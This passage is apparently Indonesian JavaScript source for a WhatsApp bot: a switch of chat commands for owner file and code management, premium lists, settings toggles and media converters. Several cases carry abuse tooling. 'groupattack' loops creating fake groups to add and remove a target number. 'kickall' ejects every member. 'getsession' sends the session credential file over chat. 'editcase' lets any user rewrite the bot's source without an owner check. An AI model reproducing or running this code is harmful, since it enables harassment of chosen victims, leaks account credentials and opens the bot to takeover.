if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
functionEnd = i + 1;
break;
}
prevChar = currentChar;
}
if (functionEnd === undefined) return ReplyRynzz(`Fungsi ${functionName} tidak lengkap atau kurung kurawal tidak seimbang`);
const updatedContent = fileContent.slice(0, functionStart) + fileContent.slice(functionEnd);
fs.writeFileSync("./Alice.js", updatedContent, "utf8");
return ReplyRynzz(`Fungsi ${functionName} telah dihapus`);
} catch (err) {
return ReplyRynzz(`Terjadi kesalahan: ${err.message}`);
}};
ReplyRynzz(deleteFunction(q));
}
break
case 'addfile': {
    if (!isOwner) return
    if (!text.includes("./")) return ReplyRynzz(`Contoh: ${XyrooRynzz} ./path/to/file.txt`);    
    let filePath = path.resolve(text);
    let dir = path.dirname(filePath);
    let fileName = path.basename(filePath);
    
    if (!fs.existsSync(dir)) {
        return ReplyRynzz('Direktori tidak ditemukan!');
    }
    
    if (!m.quoted) {
        return ReplyRynzz('Tidak ada file yang dikutip!');
    }

    try {
        let media = await downloadContentFromMessage(m.quoted, "document");
        let buffer = Buffer.from([]);
        
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]); 
        }

        if (fs.existsSync(filePath)) {
            fs.appendFileSync(filePath, buffer);
            ReplyRynzz(`Berhasil menambahkan konten ke ${fileName}`);
        } else {
            fs.writeFileSync(filePath, buffer);
            ReplyRynzz(`Berhasil membuat file ${fileName} dan menambahkan konten.`);
        }
    } catch (err) {
        console.error(err);
        ReplyRynzz('Terjadi kesalahan saat mengunduh atau menyimpan file.');
    }
}
break;
case "delfile": {
if (!isOwner) return Xowner()
if (!text) return ReplyRynzz(`Example\n${prefix + cmd} ./all/Alice.js`)
fs.unlinkSync(text)
xreply ("Berhasil Menghapus File")
}
break
case 'delfolder': case 'removefolder': {
    if (!isOwner) return Xowner();
    if (!text.startsWith("./")) {
        return ReplyRynzz(`Format salah. Contoh penggunaan: ${XyrooRynzz} ./namaFolder`);
    }
    let folderPath = path.resolve(text);
    try {
        if (!fs.existsSync(folderPath)) {
            return ReplyRynzz('Folder tidak ditemukan di lokasi tersebut!');
        }
        fs.rmdirSync(folderPath, { recursive: true });
        ReplyRynzz(`Berhasil menghapus folder ${folderPath}`);
    } catch (error) {
        console.error('Error:', error);
        ReplyRynzz('Terjadi kesalahan saat menghapus folder. Silakan coba lagi.');
    }
}
break

case 'mkdir': case 'addfolder': {
if (!isOwner) return Xowner()
if (!text.startsWith("./")) {
return ReplyRynzz(`Format salah. Contoh penggunaan: ${XyrooRynzz} ./namaFolder`);
}
let folderPath = path.resolve(text);
try {
if (fs.existsSync(folderPath)) {
return ReplyRynzz('Folder sudah ada di lokasi tersebut!');
}
fs.mkdirSync(folderPath, { recursive: true });
ReplyRynzz(`Berhasil membuat folder ${folderPath}`);
} catch (error) {
console.error('Error:', error);
ReplyRynzz('Terjadi kesalahan saat membuat folder. Silakan coba lagi.');
}}
break
case 'kickall': {
if (!m.isGroup) return Xgroup()
if (!isOwner) return ReplyRynzz('Khusus Admin!!')
if (!isBotAdmins) return ReplyRynzz('_Bot Harus Menjadi Admin Terlebih Dahulu_')
const users = participants.map(a => a.id)
await Alice.groupParticipantsUpdate(m.chat, [users], 'remove')
await ReplyRynzz(`Done`)
}
break
case 'addprem': {
if (!isOwner) return Xowner()
if (args.length < 2)
return ReplyRynzz(`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], premium);
}
ReplyRynzz("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
ReplyRynzz("Sukses Via Nomer")
await sleep(2000)
Alice.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: thumb}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: m })
}
}
break
case 'delprem': {
if (!isOwner) return Xowner()
if (args.length < 1) return ReplyRynzz(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`)
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
let mentionedPremiumIndex = premium.findIndex(premium => premium.id === m.mentionedJid[i]);
if (mentionedPremiumIndex !== -1) {
premium.splice(mentionedPremiumIndex, 1);
}
}
fs.writeFileSync("./AliceDatabase/premium.json", JSON.stringify(premium));
ReplyRynzz("Sukses Delete");
} else {
let targetNumber = args[0] + "@s.whatsapp.net"
let targetPremiumIndex = premium.findIndex(premium => premium.id === targetNumber)
if (targetPremiumIndex !== -1) {
premium.splice(targetPremiumIndex, 1)
fs.writeFileSync("./AliceDatabase/premium.json", JSON.stringify(premium))
ReplyRynzz("Sukses Via Nomer")
await sleep(2000)
Alice.sendMessage(targetNumber, {image: {url: thumb}, caption: `Kamu sekarang bukan Anggota Premium`},{quoted: m })
} else {
ReplyRynzz("Entitas premium tidak ditemukan")
}
}
}
break

case 'addowner': {
if (!isOwner) return Xowner()
if (!args[0]) return ReplyRynzz(`Penggunaan ${XyrooRynzz} nomor\nContoh ${XyrooRynzz} ${owner}`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await Alice.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(prem1)
fs.writeFileSync('./AliceDatabase/owner.json', JSON.stringify(owner))
ReplyRynzz(`${prem1} Sudah menjadi owner!!!`)
Alice.sendMessage(prem1+'@s.whatsapp.net', {image: {url: thumb}, caption: `Kamu sekarang adalah owner / owner bot`},{quoted: m})
}
break

case 'delowner': {
if (!isOwner) return Xowner()
if (!args[0]) return ReplyRynzz(`Penggunaan ${XyrooRynzz} nomor\nContoh ${XyrooRynzz} ${owner}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(prem2)
owner.splice(unp, 1)
fs.writeFileSync('./AliceDatabase/owner.json', JSON.stringify(owner))
ReplyRynzz(`${prem2} Tidak lagi owner!!!`)
}
break

case 'getidgc':
if (!m.isGroup) return ReplyRynzz('kusus Group')
ewe = `${m.chat}`
await Alice.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

case 'setwelcome':
case 'welcome':
if (!isAdmins) return Xadmin()
if (args.length < 1) return ReplyRynzz(`Example ${XyrooRynzz} on/off`)
if (q == 'on') {
global.setwelcome = true
ReplyRynzz(`Successfully Set To ${q}`)
} else if (q == 'off') {
global.setwelcome = false
ReplyRynzz(`Successfully Set To ${q}`)
}
break

case 'antical':
case 'anticall':
if (!isOwner) return Xowner()
if (args.length < 1) return ReplyRynzz(`Example ${XyrooRynzz} on/off`)
if (q == 'on') {
global.anticall = true
ReplyRynzz(`Successfully To ${q}`)
} else if (q == 'off') {
global.anticall = false
ReplyRynzz(`Successfully To ${q}`)
}
break

case 'onlygroup':
case 'onlygc':
if (!isOwner) return Xowner()
if (args.length < 1) return ReplyRynzz(`Example ${XyrooRynzz} on/off`)
if (q == 'on') {
db.data.settings[botNumber].onlygrub = true
ReplyRynzz(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlygrub = false
ReplyRynzz(`Successfully Changed Onlygroup To ${q}`)
}
break

case 'bangroup':{
if (!m.isGroup) return ReplyRynzz('Fitur Khusus Group!')
if (!isOwner) return ReplyRynzz('Fitur Khusus owner!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return ReplyRynzz(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./AliceDatabase/mute.json', JSON.stringify(mute, null, 2))
ReplyRynzz('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return ReplyRynzz(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./AliceDatabase/mute.json', JSON.stringify(mute, null, 2))
ReplyRynzz('Successfully Unmute In This Group')
}else {
ReplyRynzz(`${XyrooRynzz} on -- _mengaktifkan_\n${XyrooRynzz} off -- _Menonaktifkan_`)
}}
break

case 'groupattack': {
if (!text) return ReplyRynzz("contoh : .groupattack nomor|jumlah")
async function fakeGroupInvitationLoop(Alice, target, jumlah) {
    if (!target.includes('@s.whatsapp.net')) {
        target = target + '@s.whatsapp.net';
    }
    const createGroupAndInvite = async () => {
        try {
            const groupName = `FakeGroup_${Math.random().toString(36).substring(7)}`;
            const group = await Alice.groupCreate(groupName, [target]);
            const groupId = group.gid;
            setTimeout(async () => {
                await Alice.groupParticipantsUpdate(groupId, [target], 'remove');
                await Alice.groupLeave(groupId);
            }, 1000); 
        } catch (error) {
            console.error('Error creating group or inviting target:', error);
        }
    };

    for (let i = 0; i < `${jumlah}`; i++) {
        await createGroupAndInvite();
        await new Promise(resolve => setTimeout(resolve, 1000)); 
    }
}
const jumlah = args.join("|")
if (!jumlah) return ReplyRynzz("Masukkan Jumlah Group Yang Ingin Di Buat!")
fakeGroupInvitationLoop(Alice, `${text}` + "@s.whatsapp.net", jumlah);
   }
break

case 'altag': {
if (!isOwner) return
let xy = m.isGroup ? await groupMetadata.participants.map(a => a.id) : ""
Alice.sendMessage(m.chat, {
	text: `@${m.chat} ${text}`,
	contextInfo: {
mentionedJid: xy, 
		groupMentions: [
			{
				groupSubject: `< Altag By ${ownername} >`,
				groupJid: m.chat,
			},
		],
	},
});
}
break
		
		
		case "autorecord":
			if (!isOwner) return Xowner()
			if (text == "on" || text == "1") {
				if (db.data.settings[botNumber].autoRecord == true) return ReplyRynzz("Sudah Active")
				db.data.settings[botNumber].autoRecord = true
				ReplyRynzz(`Succes`)
			} else if (text == "off" || text == "0") {
				if (db.data.settings[botNumber].autoRecord == false) return ReplyRynzz("Sudah Non Active")
				db.data.settings[botNumber].autoRecord = false
				ReplyRynzz(`Succes`)
			} else {
				ReplyRynzz("\`\`\`「 MODE AUTO RECORD 」\`\`\`\n\n0. Off\n1. On")
			}
			break

case 'autoread':
if (!isOwner) return Xowner()
if (args.length < 1) return ReplyRynzz(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoread = true
ReplyRynzz(`Successfully Changed Auto Read To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoread = false
ReplyRynzz(`Successfully Changed Auto Read To ${q}`)
}
break

		case "autotyping":
			if (!isOwner) return Xowner()
			if (text == "on" || text == "1") {
				if (db.data.settings[botNumber].autoTyping == true) return ReplyRynzz("Sudah Active")
				db.data.settings[botNumber].autoTyping = true
				ReplyRynzz(`Succes`)
			} else if (text == "off" || text == "0") {
				if (db.data.settings[botNumber].autoTyping == false) return ReplyRynzz("Sudah Non Active")
				db.data.settings[botNumber].autoTyping = false
				ReplyRynzz(`Succes`)
			} else {
				ReplyRynzz("\`\`\`「 MODE AUTO TYPING 」\`\`\`\n\n0. Off\n1. On")
			}
			break

		case "mmk":
			if (!isOwner) return Xowner()
			if (text == "one" || text == "1") {
				if (db.data.settings[botNumber].setPrefix == "one") return ReplyRynzz("Sudah Active")
				db.data.settings[botNumber].setPrefix = "one"
				ReplyRynzz(`Succes`)
			} else if (text == "no" || text == "2") {
				if (db.data.settings[botNumber].setPrefix == "no") return ReplyRynzz("Sudah Active")
				db.data.settings[botNumber].setPrefix = "no"
				ReplyRynzz(`Succes`)
			} else if (text == "all" || text == "3") {
				if (db.data.settings[botNumber].setPrefix == "all") return ReplyRynzz("Sudah Active")
				db.data.settings[botNumber].setPrefix = "all"
				ReplyRynzz(`Succes`)
			} else {
				ReplyRynzz("\`\`\`「 SETTINGS PREFIX BOT 」\`\`\`\n\n1. one\n2. No\n3. All")
			}
			break			

case 'self': {
if (!isOwner) return Xowner()
Alice.public = false
ReplyRynzz('succes')
}
break

case 'public': {
if (!isOwner) return Xowner()
Alice.public = true
ReplyRynzz('succes')
}
break

case 'shutdown': {
if (!isOwner) return Xowner()
ReplyRynzz(`Otsukaresama deshita🖐`)
await sleep(5000)
process.exit()
}
break

case 'getsession':
if (!isOwner) return Xowner()
await xreaction()
let sesi = fs.readFileSync('./Session/creds.json')
Alice.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break

case 'delsession':
case 'clearsession': {
if (!isOwner) return Xowner()
fs.readdir("./AliceSessions", async function(err, files) {
if (err) {
console.log('Tidak Dapat Mendeteksi Directory: ' + err);
return ReplyRynzz('Tidak Dapat Mendeteksi Directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
let teks = `Detected ${filteredArray.length} junk files\n\n`
if (filteredArray.length == 0) return ReplyRynzz(teks)
filteredArray.map(function(e, i) {
teks += (i + 1) + `. ${e}\n`
})
ReplyRynzz(teks)
await sleep(2000)
ReplyRynzz("Deleting junk files...")
await filteredArray.forEach(function(file) {
    fs.unlinkSync(`./AliceSessions/${file}`)
});
await sleep(2000)
ReplyRynzz('donee')
});
}
break            
            
case 'listcase': {
if (!isOwner) return Xowner();
ReplyRynzz(listCase())
}
break

case 'getcase': {
if (!isOwner) return Xowner()
const getCase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync("./Alice.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
try{
if (!isOwner) return Xowner()
if (!q) return ReplyRynzz(`contoh : ${XyrooRynzz} nama casenya`)
let xy = await getCase(q)
ReplyRynzz(xy)
} catch(err){
console.log(err)
ReplyRynzz(`Case ${q} tidak di temukan`)
}
}
break                                  

case 'addcase': {
 if (!isOwner) return Xowner() 
 if (!text) return ReplyRynzz(`Example : ${XyrooRynzz} 'namacase': { file case`);
 const fs = require('fs');
const namaFile = 'Alice.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('error:', err);
 return;
 }
 const posisiAwalGimage = data.indexOf("case");
 if (posisiAwalGimage !== -1) {
 const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
 fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 ReplyRynzz('error:', err);
 } else {
 ReplyRynzz('Successfully add case');
 }
 });
 } else {
 ReplyRynzz('error');
 }
});
}
break 

case 'sendcase':
case 'sendfitur': {   
if (!isOwner) return Xowner();
if (!m.quoted) return ReplyRynzz('Kutip pesan seseorang!');
if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} gpt`);
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./Alice.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return ReplyRynzz(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return ReplyRynzz(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const caseName = text.trim();
getCase(caseName)
.then(caseCode => {
const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!recipient || !recipient.includes('@s.whatsapp.net')) {
return ReplyRynzz('Format ID WhatsApp tidak valid!');
}
const sendFeature = async (recipient, caseCode) => {
try {
const contact = (await Alice.onWhatsApp(recipient.split('@')[0]))[0] || {};
if (!contact) return ReplyRynzz('Kontak tidak ditemukan di WhatsApp.');
const message = `Hi, kamu dapet kiriman fitur nih!\n\n${caseCode}`;
await Alice.sendMessage(recipient, { text: message }, { quoted: m });
ReplyRynzz('Fitur berhasil terkirim!');
} catch (error) {
console.error('Terjadi kesalahan:', error.message);
ReplyRynzz('Terjadi kesalahan saat mengirim fitur: ' + error.message);
}};
sendFeature(recipient, caseCode);
})
.catch(error => ReplyRynzz(`Terjadi kesalahan: ${error.message}`));
}
break

case 'editcase': {
 if (!text) return ReplyRynzz(`Contoh penggunaan: ${XyrooRynzz} <nama_case> | <isi_case_baru>`);
 let [caseName, ...newContentArr] = text.split('|');
 caseName = caseName.trim();
 let newContent = newContentArr.join('|').trim();
 if (!caseName || !newContent) {
 return ReplyRynzz('Format salah! Gunakan format: .editcase <nama_case> | <isi_case_baru>');
 }
 const fs = require('fs');
 const filePath = './Alice.js';
 try {
 if (!fs.existsSync(filePath)) {
 return ReplyRynzz(`File bot tidak ditemukan.`);
 }
 let fileContent = fs.readFileSync(filePath, 'utf-8');
 const regex = new RegExp(`case ['"]${caseName}['"]: {([\\s\\S]*?)}\\s*break;`, 'g');
 if (!regex.test(fileContent)) {
 return ReplyRynzz(`Case *${caseName}* tidak ditemukan.`);
 }
 const updatedFileContent = fileContent.replace(regex, `case '${caseName}': {\n${newContent}\n}\nbreak`);
 fs.writeFileSync(filePath, updatedFileContent, 'utf-8');
 ReplyRynzz(`Case *${caseName}* berhasil diedit.`);
 } catch (error) {
 console.error('Error:', error);
 return ReplyRynzz('Terjadi kesalahan saat mengedit case. Coba lagi nanti.');
 }
}
break;

case "delcase": {
if (!isOwner) return Xowner();
if (!q) return ReplyRynzz("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

let caseName = q

let fileContent = fs.readFileSync("./Alice.js", "utf-8");

let startIndex = fileContent.indexOf(`case "${caseName}"`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./Alice.js", fileContent, "utf-8");

ReplyRynzz(`Case "${caseName}" berhasil dihapus!`);
} else {
ReplyRynzz(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Owner Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Convert Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'quoteimg': {
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Kirim teks quotesnya!\nContoh: ${XyrooRynzz} Jangan pernah menyerah, bro.`);
  const { createCanvas, loadImage } = require('canvas');
  function wrapText(ctx, text, maxWidth) {
    const words = text.split(' ');
    let lines = [];
    let currentLine = words[0];
    for (let i = 1; i < words.length; i++) {
      const word = words[i];
      const width = ctx.measureText(currentLine + ' ' + word).width;
      if (width < maxWidth) {
        currentLine += ' ' + word;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    lines.push(currentLine);
    return lines;
  }
  async function generateQuoteImage(ppUrl, username, quoteText) {
    const width = 1000;
    const height = 500;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000000';
    ctx.fillRect(0, 0, width, height);
    const avatar = await loadImage(ppUrl);
    ctx.save();
    ctx.beginPath();
    ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
    ctx.closePath();
    ctx.clip();
    ctx.drawImage(avatar, 60, 130, 240, 240);
    ctx.restore();
    ctx.fillStyle = '#ffffff';
    ctx.font = '28px sans-serif';
    let lines = wrapText(ctx, quoteText, 600);
    lines.forEach((line, i) => {
      ctx.fillText(line, 350, 180 + i * 35);
    });
    ctx.fillStyle = '#aaaaaa';
    ctx.font = '22px italic';
    ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
    return canvas.toBuffer();
  }
  let pushname = m.pushName || m.sender.split('@')[0];
  let ppUrl = await Alice.profilePictureUrl(m.sender, 'image').catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60');
  let buffer = await generateQuoteImage(ppUrl, pushname, text);

  await Alice.sendMessage(m.chat, {
    image: buffer,
    caption: `📝 Quote dari *${pushname}*`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });
}
break
      case "shortlink":
      case "shorturl": {
if (isBan) return Xban()
await xreaction()      
          if (!text) return ReplyRynzz(`Example: ${XyrooRynzz} https://xyroorinzi.net`);
          if (!isUrl(text)) return ReplyRynzz(`Example: ${XyrooRynzz} https://xyroorinzi.net`);
          var res = await axios.get(
            "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(text)
          );
          var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`;
          return ReplyRynzz(link);
        }
        break;
case 'morse': {
if (isBan) return Xban()
await xreaction()
  if (!q) return ReplyRynzz('Masukkan Teks Yang Ingin Diubah Menjadi Sandi Morse');
  try {
      const morseCode = await convertToMorse(q);
      let responseMessage = `*Teks Asli :*\n_${q}_\n\n*Sandi Morse:*\n${morseCode}`;
      ReplyRynzz(responseMessage);
  } catch (err) {
      console.error(err);
      ReplyRynzz('Terjadi Kesalahan Saat Mengonversi Teks Menjadi Sandi Morse!');
  }
}
break

case 'bratvid':
case 'bratvidio':
case 'bratvideo': {
if (isBan) return Xban()
  if (!text) return ReplyRynzz(`Contoh: ${XyrooRynzz} hai bang`)
  await xreaction()
  if (!isOwner && global.db.data.users[m.sender].limit < 1) return onlyLimit()
  if (text.length > 250) return ReplyRynzz(`Karakter terbatas, max 250!`)

  const words = text.split(" ")
  const tempDir = path.join(process.cwd(), 'AliceLibray')
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
  const framePaths = []

  try {
    for (let i = 0; i < words.length; i++) {
      const currentText = words.slice(0, i + 1).join(" ")

      const res = await axios.get(
        `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(currentText)}`,
        { responseType: "arraybuffer" }
      ).catch((e) => e.response)

      const framePath = path.join(tempDir, `frame${i}.mp4`)
      fs.writeFileSync(framePath, res.data)
      framePaths.push(framePath)
    }

    const fileListPath = path.join(tempDir, "filelist.txt")
    let fileListContent = ""

    for (let i = 0; i < framePaths.length; i++) {
      fileListContent += `file '${framePaths[i]}'\n`
      fileListContent += `duration 0.7\n`
    }

    fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
    fileListContent += `duration 2\n`

    fs.writeFileSync(fileListPath, fileListContent)
    const outputVideoPath = path.join(tempDir, "output.mp4")
    execSync(
      `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`
    )

    await Alice.sendImageAsSticker(m.chat, outputVideoPath, xy, {
      packname: '',
      author: `${author}`
    })

    framePaths.forEach((frame) => {
      if (fs.existsSync(frame)) fs.unlinkSync(frame)
    })
    if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
    if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
  } catch (err) {
    console.error(err)
    ReplyRynzz('Terjadi kesalahan')
  }
uselimit()
ReplyRynzz( Xlimit() )
}
break

case 'brat': {
if (isBan) return Xban()
xreaction()
if (!isOwner && global.db.data.users[m.sender].limit < 1) return onlyLimit()
if (!q) return ReplyRynzz(`Masukkan teks\n\nContoh: ${XyrooRynzz} alok hamil`);
let rulz = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(q)}`;
try {
const res = await axios.get(rulz, { responseType: 'arraybuffer' });
const buffer = Buffer.from(res.data, 'binary');
await Alice.sendImageAsSticker(m.chat, buffer, m, { packname: ``, author: `${author}` });
} catch (e) {
console.log(e);
await ReplyRynzz(`Sedang maintenance atau API error`);
    }
uselimit()
ReplyRynzz(  Xlimit() )
}
break
case 'emojimix': {
if (isBan) return Xban()
await xreaction()
    if (!text) return ReplyRynzz(`Example : 😎+😂 atau 😎|😂`);

    const emojis = text.split(/[\+\|]/);
    if (emojis.length !== 2) return ReplyRynzz('Silakan masukkan dua emoji yang valid, example: 😎+😂 atau 😎|😂');

    const text1 = emojis[0].trim();
    const text2 = emojis[1].trim();
 
    let api = `https://fastrestapis.fasturl.cloud/maker/emojimix?emoji1=${text1}&emoji2=${text2}`;
    await Alice.sendImageAsSticker(m.chat, api, xy, { packname: '', author: `${packname}` });
}
break;
case 'qc': {
if (isBan) return Xban()
await xreaction()
if (!isOwner && global.db.data.users[m.sender].limit < 1) return onlyLimit()
    const { quote } = require('./AliceLibray/quote.js');
    let text;

    if (args.length >= 1) {
        text = args.slice(0).join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return ReplyRynzz("Input teks atau reply teks yang ingin di jadikan quote!");
    }

    if (!text) return ReplyRynzz('masukan text');
    if (text.length > 200) return ReplyRynzz('Maksimal 200 Teks!');

    let ppnyauser = await Alice.profilePictureUrl(m.sender, 'image').catch(_ => 'https://files.catbox.moe/nwvkbt.png');
    const rest = await quote(text, pushname, ppnyauser);
    Alice.sendImageAsSticker(m.chat, rest.result, m, {
        packname: ``,
        author: `${global.author}`
    });
uselimit()
ReplyRynzz(  Xlimit() )
}
break

case 'tr':
case 'translate': {
if (isBan) return Xban()
await xreaction()
    let translate = require('translate-google-api');
    let defaultLang = 'en';
    let tld = 'cn';
    let toks = `
Contoh:
${XyrooRynzz} <lang> [text]
${XyrooRynzz} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim();

    let lang = args[0];
    let text = args.slice(1).join(' ');

    if ((args[0] || '').length !== 2) {
        lang = defaultLang;
        text = args.join(' ');
    }

    if (!text && m.quoted && m.quoted.text) {
        text = m.quoted.text;
    }

    let result;
    try {
        result = await translate(`${text}`, { to: lang });
    } catch (e) {
        result = await translate(`${text}`, { to: defaultLang });
        ReplyRynzz(`Contoh:
${XyrooRynzz} <lang> [text]
${XyrooRynzz} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`);
    } finally {
        ReplyRynzz(result[0]);
    }
}
break;
            case 'img2txt':
if (isBan) return Xban()
await xreaction()
                if (!/image/.test(mime)) return ReplyRynzz(`*Gambarnya Mana?*`)
                if (/image/.test(mime)) {
                    await xreaction()
                    let mee = await Alice.downloadAndSaveMediaMessage(quoted)
                    let mem = await TelegraPh(mee)
                    let len = await (await fetch(`https://itzpire.com/tools/img2text?url=${mem}`)).json()
                    let result = len.result
                    Alice.sendMessage(m.chat, { image: { url: mem }, caption: `${result}` }, { quoted: m })
                }
                break

            case 'img2promt':
if (isBan) return Xban()
await xreaction()
                if (!/image/.test(mime)) return ReplyRynzz(`Gambarnya Mana?`)
                if (/image/.test(mime)) {
                    await xreaction()
                    let mee = await Alice.downloadAndSaveMediaMessage(quoted)
                    let mem = await TelegraPh(mee)
                    let len = await (await fetch(`https://itzpire.com/tools/img2prompt?url=${mem}`)).json()
                    let result = len.result
                    Alice.sendMessage(m.chat, { image: { url: mem }, caption: `${result}` }, { quoted: m })
                }
                break

case 'togift':
case 'togif': {
if (isBan) return Xban()
await xreaction()
    if (!isMedia) {
        return ReplyRynzz(`Contoh Pengguna\n${XyrooRynzz} *dengan reply sticker/gif*`);
    }
    await xreaction();
    try {
        let media = await Alice.downloadAndSaveMediaMessage(quoted);
        await Alice.sendMessage(m.chat, {
            video: media,
            mimetype: 'video/mp4',
            gifPlayback: true
        }, { quoted: m });
    } catch (e) {
       let media = await Alice.downloadAndSaveMediaMessage(quoted)
       let Xyroo = await ShannzCdn(media)
       let jembut = Xyroo.result.url;
       let memek = await Webp2Mp4(jembut); 
        let kontol = memek.convertUrl;
        await Alice.sendMessage(m.chat, { video: { url: kontol }, gifPlayback: true }, { quoted: m });
    }
}
break;
case 'tomp4':
case 'tovideo':
case 'tovid': {
if (isBan) return Xban()
await xreaction()
    if (!isMedia) {
        return ReplyRynzz(`Contoh Pengguna\n${XyrooRynzz} *dengan reply sticker/gif*`);
    }

    await xreaction();
    try {
        // Mengunduh dan menyimpan media yang di-reply
        let media = await Alice.downloadAndSaveMediaMessage(quoted);
        
        // Mengambil URL dari CDN
        let Xyroo = await ShannzCdn(media); // Pastikan ini adalah fungsi async jika perlu
        let jembut = Xyroo.result.url;

        // Mengonversi file WebP ke MP4
        let memek = await Webp2Mp4(jembut); // Pastikan ini adalah fungsi async jika perlu
        let kontol = memek.convertUrl;

        // Mengirimkan video yang telah dikonversi
        await Alice.sendMessage(m.chat, { video: { url: kontol }, caption: 'donee' }, { quoted: m });
    } catch (error) {
        console.error(error); // Menampilkan error di console untuk debugging
        return Xerror();
    }
}
break;

case 'tovn': {
if (isBan) return Xban()
await xreaction()
if (!isMedia) throw ReplyRynzz(`Reply video/audio dengan caption ${XyrooRynzz}`)
if (!quoted) throw ReplyRynzz(`Reply video/audio dengan caption ${XyrooRynzz}`)
await xreaction()
try {
var dl = await m.quoted.download()
Alice.sendMessage(m.chat, {audio: dl, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: channel,
title: `${global.botname} `,
body: `$${ownername}`,
sourceUrl: `${global.channel}`,
thumbnail: ppnyauser
}
}}, { quoted: m })
} catch (error) {
  return Xerror()
}
}
break

case 'tomp3':
case 'toaudio': {
if (isBan) return Xban()
await xreaction()
if (!isMedia) throw ReplyRynzz(`Reply video/audio dengan caption ${XyrooRynzz}`)
if (!quoted) throw ReplyRynzz(`Reply video/audio dengan caption ${XyrooRynzz}`)
await xreaction()
try {
var dl = await m.quoted.download()
Alice.sendMessage(m.chat, {audio: dl, mimetype:'audio/mpeg', ptt:false, contextInfo:{  externalAdReply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: channel,
title: `${global.botname}`,
body: `Hai ${pushname}`,
